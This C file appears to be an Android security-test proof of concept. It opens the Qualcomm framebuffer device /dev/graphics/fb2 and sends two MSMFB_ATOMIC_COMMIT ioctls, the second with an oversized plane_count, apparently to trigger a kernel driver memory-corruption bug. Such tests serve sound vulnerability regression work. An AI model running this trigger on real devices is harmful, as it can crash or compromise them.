/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#define _GNU_SOURCE
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include "local_poc.h"

int main(int argc, char **argv) {
  int ret, i, count;
  int fd;
  struct mdp_layer_commit commit;
  struct mdp_output_layer output_layer;

  fd = open("/dev/graphics/fb2", O_RDWR, 0);
  if (fd < 0) {
    return -1;
  }

  output_layer.buffer.plane_count = 1;
  output_layer.writeback_ndx = 1;
  commit.commit_v1.output_layer = &output_layer;

  commit.commit_v1.input_layer_cnt = 0;
  commit.version = 0x00010000;
  commit.commit_v1.flags = 0x01;

  ret = ioctl(fd, MSMFB_ATOMIC_COMMIT, &commit);
  if (ret < 0) {
    printf("err:%s\n", strerror(errno));
  }

  output_layer.buffer.plane_count = 0x00FFFFFF;
  commit.commit_v1.output_layer = &output_layer;

  commit.commit_v1.input_layer_cnt = 0;
  commit.version = 0x00010000;
  commit.commit_v1.flags = 0;

  ret = ioctl(fd, MSMFB_ATOMIC_COMMIT, &commit);
  if (ret < 0) {
    printf("err:%s\n", strerror(errno));
  }

  close(fd);

  return 0;
}
